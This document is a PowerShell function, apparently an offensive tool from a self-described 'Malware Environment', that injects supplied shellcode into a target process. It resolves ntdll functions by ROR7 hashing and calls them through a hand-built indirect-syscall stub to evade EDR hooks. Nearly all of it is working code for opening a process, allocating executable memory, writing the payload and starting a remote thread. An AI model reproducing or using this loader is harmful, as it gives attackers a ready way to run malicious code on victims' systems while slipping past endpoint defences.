function IndirectSyscall-Shellcode {
<#
.DESCRIPTION
        Author: Silentis Vox (@SilentisVox)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

.SYNOPSIS
        PowerShell offers many tools to execute shellcode. However, no
        technique can evade EDRs. When shellcode makes it to the last
        step in execution, all could fail to a simple EDR hook. We can
        evade this with some simple jump instructions. In my case, by
        writing the shellcode to the stack, we can make a relative jmp
        to the syscall instruction.

        Windows ABI follows a standard calling convention.
        
        RCX                          => 1st parameter
        RDX                          => 2nd parameter
        R8                           => 3rd parameter
        R9                           => 4th parameter
        [RSP + 0x20]                 => 5th parameter
        [RSP + 0x28]                 => 6th parameter
        ...
        [RSP + 0x00 .. 0x18] is given to the functions being called. This
        stack space is used to save any arguments that as may need be. In
        our case, we temporarily save a syscall address to the stack.

        As for the stubbing instructions we need to do the same things a
        stub does, while also preparing for the indirect jmp.

        FRANKEN_STUB:
                MOV     RAX,    QWORD   [SYSCALL_ADDRESS]
                MOV     QWORD   [RSP + 0x08],     RAX
                MOV     R10,    RCX
                MOV     EAX,    DWORD   [SYSTEM_SERVICE_NUMBER]
                JMP     QWORD   [RSP + 0x08]

        
                  .,u%SS$$S3%u.
                ,d$HB$7^’  ‘^=$$i:.
              ,$/”  |7$b.      ‘*$i,
              $$    7’ `bpu,.  .,ud\
              ;b.,/$,.\,.,S$3$S$7$$=
              :ibU$*J.;u;S*S$*^o31s\
              q$S7JmkSw+=*%$$#bi:;;.;
              ks::^*}]|^‘%^*\9L’;:;s.
               7; ;i/+       ‘7\ ,;.
                ‘: I|          $ ;J.
                 ’,‘b,         ^ 7’.
                   ‘ I:      .j| $S:
           broken   “i3.\ %.,,|$.$J’
             silence ’;5m\*7uTqr3;’
                       ;2u,..,;i,‘
                         “^=+=”’

.EXAMPLE
        IndirectSyscall-Shellcode -Buffer $Shellcode -TargetPID 221

        [  OK  ] [221] PID located.
        [  OK  ] [0x00000000000000D3] Opened process.
        [  OK  ] [0x0000039C5E493000] Allocated memory inside process.
        [  OK  ] [0x0000039C5E493000] Wrote buffer to address.
        [  OK  ] [0x0000039C5E493000] Created thread starting at address.
#>
        [CmdletBinding()]
        param(
                [Parameter(Mandatory)]
                [byte[]] $Buffer,

                [Parameter(Mandatory = $false)]
                [string] $ProcessName,

                [Parameter(Mandatory = $false)]
                [int] $ProcessId
        )

        $Escape  = [char] 0x1b
        $End     = "$Escape[0m"
        $Green   = "$Escape[38;2;0;255;0m"
        $Red     = "$Escape[38;2;255;0;0m"
        $Gray    = "$Escape[38;2;150;150;150m"
        $Ok      = "[  $($Green)OK$($End)  ]"
        $Fail    = "[ $($Red)FAIL$($End) ]"

        [Console]::Write("**** SilentisVox Malware Environment **** `n")
        [Console]::Write("silentis v4.1.0 (64 bit) `n")
        [Console]::Write("`n")

        # 
        # FRANKEN_STUB:
        #         MOV     RAX,    QWORD   [SYSCALL_ADDRESS]
        #         MOV     QWORD   [RSP + 0x08],     RAX
        #         MOV     R10,    RCX
        #         MOV     EAX,    DWORD   [SYSTEM_SERVICE_NUMBER]
        #         JMP     QWORD   [RSP + 0x08]
        # 

        $FrankenStub = [byte[]] @(
                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                0x48, 0x89, 0x44, 0x24, 0x08,
                0x49, 0x89, 0xCA,
                0xB8, 0x00, 0x00, 0x00, 0x00, 
                0xFF, 0x64, 0x24, 0x08
        )

        Add-Type @"
        using System;
        using System.Runtime.InteropServices;

        public class Indirection {
                [UnmanagedFunctionPointer(CallingConvention.Winapi)]
                public delegate IntPtr FrankenStub(
                        IntPtr pArg1,
                        IntPtr pArg2,
                        IntPtr pArg3,
                        IntPtr pArg4,
                        IntPtr pArg5,
                        IntPtr pArg6,
                        IntPtr pArg7,
                        IntPtr pArg8,
                        IntPtr pArg9,
                        IntPtr pArg10,
                        IntPtr pArg11,
                        IntPtr pArg12
                );
        }
"@      -WarningAction SilentlyContinue

        $g = @{ 
                STUB     = 0
                DELEGATE = 0
        }

        function SET_SYSCALL ($SYSCALL) {
                [Runtime.InteropServices.Marshal]::WriteIntPtr($g.STUB, 2, $SYSCALL.SyscallInstruction)
                [Runtime.InteropServices.Marshal]::WriteInt16($g.STUB, 19, $SYSCALL.SystemServiceNumber)
                $g.DELEGATE = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($g.STUB, [Indirection+FrankenStub])
        }

        function RUN_SYSCALL ($PARAMS) {
                $NATURALIZED = [IntPtr[]]::new(12)

                for ($index = 0; $index -lt $PARAMS.Length; $index++) {
                        $NATURALIZED[$index] = $PARAMS[$index]
                }

                return $g.DELEGATE.INVOKE(
                        $NATURALIZED[0],
                        $NATURALIZED[1],
                        $NATURALIZED[2],
                        $NATURALIZED[3],
                        $NATURALIZED[4],
                        $NATURALIZED[5],
                        $NATURALIZED[6],
                        $NATURALIZED[7],
                        $NATURALIZED[8],
                        $NATURALIZED[9],
                        $NATURALIZED[10],
                        $NATURALIZED[11]
                )
        }

        function NT_SUCCESS ($STATUS) {
                if (-not $STATUS) { return $true } return $STATUS
        }

        if (-not $ProcessName -and -not $ProcessId) {
                Write-Verbose "[!] Must specify target process or target pid."
                return
        }

        $ModuleConfig                           = @{
                pModule                         = 0
                NumberOfNames                   = 0
                ArrayOfAddresses                = 0
                ArrayOfNames                    = 0
                ArrayOfOrdinals                 = 0
        }

        function GET_MODULE ($MODULE) {
                foreach ($LoadedModule in [Diagnostics.Process]::GetCurrentProcess().Modules) {
                        if ($LoadedModule.FileName -match "\\$MODULE") {
                                return $LoadedModule.BaseAddress
                        }
                }
        }

        function INIT_NTDLL_CONFIG {
                $pNtdll                         = GET_MODULE "NTDLL.DLL"
                $pNtHdr                         = [IntPtr]::Add($pNtdll, [Runtime.InteropServices.Marshal]::ReadInt32($pNtdll, 0x3C))
                $pExpDir                        = [IntPtr]::Add($pNtdll, [Runtime.InteropServices.Marshal]::ReadInt32($pNtHdr, 0x88))

                $ModuleConfig.pModule           = $pNtdll
                $ModuleConfig.NumberOfNames     = [Runtime.InteropServices.Marshal]::ReadInt32($pExpDir, 0x18)
                $ModuleConfig.ArrayOfAddresses  = [IntPtr]::Add($pNtdll, [Runtime.InteropServices.Marshal]::ReadInt32($pExpDir, 0x1C))
                $ModuleConfig.ArrayOfNames      = [IntPtr]::Add($pNtdll, [Runtime.InteropServices.Marshal]::ReadInt32($pExpDir, 0x20))
                $ModuleConfig.ArrayOfOrdinals   = [IntPtr]::Add($pNtdll, [Runtime.InteropServices.Marshal]::ReadInt32($pExpDir, 0x24))
        }

        function ROR7_32 ($pSymbolName) {
                $hash                           = [UInt32] 0
                $index                          = 0

                while ($byte = [Runtime.InteropServices.Marshal]::ReadByte($pSymbolName, $index)) {
                        $hash                   = (($hash -shr 7) -bor ($hash -shl (32 - 7)))   -band [UInt32]::MaxValue
                        $hash                   = ($hash + $byte)                               -band [UInt32]::MaxValue
                        $index++
                }
                return $hash
        }

        function GET_NTDLL_FUN ($SymbolHash, $SymbolData) {
                if (-not $ModuleConfig.pModule) {
                        INIT_NTDLL_CONFIG
                }
                for ($index = 0; $index -ne $ModuleConfig.NumberOfNames; $index++) {
                        $pSymbolName            = [IntPtr]::Add($ModuleConfig.pModule, [Runtime.InteropServices.Marshal]::ReadInt32($ModuleConfig.ArrayOfNames, ($index * 4)))

                        if ((ROR7_32 $pSymbolName) -ne $SymbolHash) {
                                continue
                        }
                        $SymbolSlot             = [Runtime.InteropServices.Marshal]::ReadInt16($ModuleConfig.ArrayOfOrdinals, ($index * 2))
                        $SymbolData.SyscallStub = [IntPtr]::Add($ModuleConfig.pModule, [Runtime.InteropServices.Marshal]::ReadInt32($ModuleConfig.ArrayOfAddresses, ($SymbolSlot * 4)))
                        break
                }
                for ($index = 0; $index -ne 255; $index++) {
                        if (([Runtime.InteropServices.Marshal]::ReadInt32($SymbolData.SyscallStub, $index) -band ([UInt32] 4278190335)) -ne 184) {
                                continue
                        }
                        $SymbolData.SystemServiceNumber = [Runtime.InteropServices.Marshal]::ReadInt32($SymbolData.SyscallStub, ($index + 1))
                        break
                }
                for ($index = 0; $index -ne 255; $index++) {
                        if ([Runtime.InteropServices.Marshal]::ReadInt16($SymbolData.SyscallStub, $index) -ne 1295) {
                                continue
                        }
                        $SymbolData.SyscallInstruction = [IntPtr]::Add($SymbolData.SyscallStub, $index)
                        break
                }
                if (-not $SymbolData.SyscallInstruction) {
                        $SymbolData.SyscallInstruction = $SymbolData.SyscallStub
                }
        }

        $ROR7_32__NtOpenProcess                 = 2071160147
        $ROR7_32__NtAllocateVirtualMemory       = 20989102
        $ROR7_32__NtWriteVirtualMemory          = 288391501
        $ROR7_32__NtCreateThreadEx              = 2481757501

        $NtdllFunction                          = @{
                SyscallStub                     = 0
                SystemServiceNumber             = 0
                SyscallInstruction              = 0
        }

        $gNtdllApi                              = @{
                NtOpenProcess                   = $NtdllFunction.Clone()
                NtAllocateVirtualMemory         = $NtdllFunction.Clone()
                NtWriteVirtualMemory            = $NtdllFunction.Clone()
                NtCreateThreadEx                = $NtdllFunction.Clone()
        }

        function INIT_NTDLL_API {
                GET_NTDLL_FUN  $ROR7_32__NtOpenProcess            $gNtdllApi.NtOpenProcess
                GET_NTDLL_FUN  $ROR7_32__NtAllocateVirtualMemory  $gNtdllApi.NtAllocateVirtualMemory
                GET_NTDLL_FUN  $ROR7_32__NtWriteVirtualMemory     $gNtdllApi.NtWriteVirtualMemory
                GET_NTDLL_FUN  $ROR7_32__NtCreateThreadEx         $gNtdllApi.NtCreateThreadEx
        }

        function STRUCT ($BUFFER = 0, $SIZE = 0) {
                if (-not ($SAFE_SIZE = $SIZE)) {
                        $SAFE_SIZE = $BUFFER.Length
                }
                $pSTRUCT = [Runtime.InteropServices.Marshal]::AllocHGlobal($SAFE_SIZE)

                if (-not ($SAFE_BUFFER = $BUFFER)) {
                        $SAFE_BUFFER = [byte[]]::new($SAFE_SIZE)
                }
                [Runtime.InteropServices.Marshal]::Copy($SAFE_BUFFER, 0, $pSTRUCT, $SAFE_SIZE)

                return $pSTRUCT
        }

        function MAKE_FRANKENSTUB_EXECUTABLE {
                $STUB           = STRUCT $FrankenStub 27
                $pSTUB          = STRUCT -SIZE 8
                [Runtime.InteropServices.Marshal]::WriteIntPtr($pSTUB, $STUB)

                $dwSize         = STRUCT -SIZE 8
                [Runtime.InteropServices.Marshal]::WriteInt64($dwSize, 27)

                $MEM_COMMIT             = [IntPtr]::new(0x00001000)
                $PAGE_EXECUTE_READWRITE = [IntPtr]::new(0x40)

                $TempAlloc      = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($gNtdllApi.NtAllocateVirtualMemory.SyscallStub, [Indirection+FrankenStub])
                $RESULT         = $TempAlloc.INVOKE(
                        [IntPtr]::new(-1),
                        $pSTUB,
                        [IntPtr]::Zero,
                        $dwSize,
                        $MEM_COMMIT,
                        $PAGE_EXECUTE_READWRITE,
                        [IntPtr]::Zero,
                        [IntPtr]::Zero,
                        [IntPtr]::Zero,
                        [IntPtr]::Zero,
                        [IntPtr]::Zero,
                        [IntPtr]::Zero
                )
                $g.STUB = $STUB
        }

        function GET_PID {
                if ($ProcessId) {
                        if (-not ($ProcessId -in (Get-Process).Id)) {
                                return 0
                        }
                        return $ProcessId
                }
                foreach ($Process in Get-Process) {
                        if ($Process.Path -match "\\$ProcessName") {
                                return $Process.Id
                        }
                }
                return 0
        }

        INIT_NTDLL_API
        MAKE_FRANKENSTUB_EXECUTABLE

        if (-not ($ResolvedPID = GET_PID)) {
                [Console]::Write("$Fail$Gray Stopped$End Unable to locate PID. `n")
                [Console]::Write("$Escape[?25h")
                return
        } else { [Console]::Write("$Ok$Gray [$ResolvedPID]$End PID located. `n") }

        # NtOpenProcess requires 4 parameters.
        #
        # RCX                  => Pointer to handle.
        # RDX                  => Access mask.
        # R8                   => Pointer to Object Attributes
        # R9                   => Pointer to Client ID.

        $hProcess                       = STRUCT -SIZE 8
        $PROCESS_ALL_ACCESS             = [IntPtr]::new(0x001F0FFF)
        $ObjectAttributes               = STRUCT -SIZE 48
        $ClientId                       = STRUCT -SIZE 16

        [Runtime.InteropServices.Marshal]::WriteInt32($ObjectAttributes, 0, 0x30)
        [Runtime.InteropServices.Marshal]::WriteInt64($ClientId, 0, $ResolvedPID)

        SET_SYSCALL($gNtdllApi.NtOpenProcess)
        if (-not (NT_SUCCESS($SUCCESS = RUN_SYSCALL(
                $hProcess,
                $PROCESS_ALL_ACCESS,
                $ObjectAttributes,
                $ClientId
        )))) {
                [Console]::Write("$Fail$Gray Stopped$End NtOpenProcess failed: [0x{0:X8}] `n" -f $SUCCESS.ToInt32())
                [Console]::Write("$Escape[?25h")
                return
        } else { [Console]::Write("$Ok$Gray [0x{0:X16}]$End Opened process. `n" -f [Runtime.InteropServices.Marshal]::ReadIntPtr($hProcess).ToInt64()) }

        # NtAllocateVirtualMemory requires 6 parameters.
        #
        # RCX                  => Process handle.
        # RDX                  => Pointer to address.
        # R8                   => Zero bits.
        # R9                   => Pointer to size.
        # [RSP + 0x20]         => Memory mode.
        # [RSP + 0x28]         => Page mode.
        #
        # An important note: when allocating memory, the
        # OS will allocate according to PAGE. The return
        # address will be a new one on the start of this
        # said PAGE. If the address is already know, you
        # must respecify the address when writing memory.

        $hProcess                       = [Runtime.InteropServices.Marshal]::ReadIntPtr($hProcess)
        $pAddress                       = STRUCT -SIZE 8
        $dwSize                         = STRUCT -SIZE 8
        $MEM_COMMIT                     = [IntPtr]::new(0x00001000)
        $PAGE_EXECUTE_READWRITE         = [IntPtr]::new(0x40)

        [Runtime.InteropServices.Marshal]::WriteInt64($dwSize, 0, $Buffer.Length)

        SET_SYSCALL($gNtdllApi.NtAllocateVirtualMemory)
        if (-not (NT_SUCCESS($SUCCESS = RUN_SYSCALL(
                $hProcess,
                $pAddress,
                [IntPtr]::Zero,
                $dwSize,
                $MEM_COMMIT,
                $PAGE_EXECUTE_READWRITE
        )))) {
                [Console]::Write("$Fail$Gray Stopped$End NtAllocateVirtualMemory failed: [0x{0:X8}] `n" -f $SUCCESS.ToInt32())
                [Console]::Write("$Escape[?25h")
                return
        } else { [Console]::Write("$Ok$Gray [0x{0:X16}]$End Allocated memory inside process. `n" -f [Runtime.InteropServices.Marshal]::ReadIntPtr($pAddress).ToInt64()) }

        # NtWriteVirtualMemory requires 5 parameters.
        #
        # RCX                  => Process handle.
        # RDX                  => Pointer to address.
        # R8                   => Pointer to memory to copy.
        # R9                   => Length of memory to copy.
        # [RSP + 0x20]         => Pointer to bytes copied.

        $pAddress                       = [Runtime.InteropServices.Marshal]::ReadIntPtr($pAddress)
        $pBuffer                        = STRUCT $Buffer $Buffer.Length
        $dwBytesWritten                 = STRUCT -SIZE 8

        SET_SYSCALL($gNtdllApi.NtWriteVirtualMemory)
        if (-not (NT_SUCCESS($SUCCESS = RUN_SYSCALL(
                $hProcess,
                $pAddress,
                $pBuffer,
                [IntPtr]::new($Buffer.Length),
                $dwBytesWritten
        )))) {
                [Console]::Write("$Fail$Gray Stopped$End NtWriteVirtualMemory failed: [0x{0:X8}] `n" -f $SUCCESS.ToInt32())
                [Console]::Write("$Escape[?25h")
                return
        } else { [Console]::Write("$Ok$Gray [0x{0:X16}]$End Wrote buffer to address. `n" -f $pAddress.ToInt64()) }

        # NtCreateThreadEx requires 11 parameters.
        #
        # RCX                  => Pointer to thread handle.
        # RDX                  => Thread access.
        # R8                   => Pointer to object attributes
        # R9                   => Process handle.
        # [RSP + 0x20]         => Pointer to memory region.
        # [RSP + 0x28]         => Arguments.
        # [RSP + 0x30]         => Creation flags.
        # [RSP + 0x38]         => Zero bits.
        # [RSP + 0x40]         => Stack size.
        # [RSP + 0x48]         => Max stack size.
        # [RSP + 0x50]         => Attribute list.

        $hThread                        = STRUCT -SIZE 8
        $THREAD_ALL_ACCESS              = [IntPtr]::new(0x001F03FF)

        SET_SYSCALL($gNtdllApi.NtCreateThreadEx)
        if (-not (NT_SUCCESS($SUCCESS = RUN_SYSCALL(
                $hThread,
                $THREAD_ALL_ACCESS,
                [IntPtr]::Zero,
                $hProcess,
                $pAddress,
                [IntPtr]::Zero,
                [IntPtr]::Zero,
                [IntPtr]::Zero,
                [IntPtr]::Zero,
                [IntPtr]::Zero,
                [IntPtr]::Zero
        )))) {
                [Console]::Write("$Fail$Gray Stopped$End NtCreateThreadEx failed: [0x{0:X8}] `n" -f $SUCCESS.ToInt32())
                [Console]::Write("$Escape[?25h")
                return
        } else { [Console]::Write("$Ok$Gray [0x{0:X16}]$End Created thread starting at address. `n" -f $pAddress.ToInt64()) }
}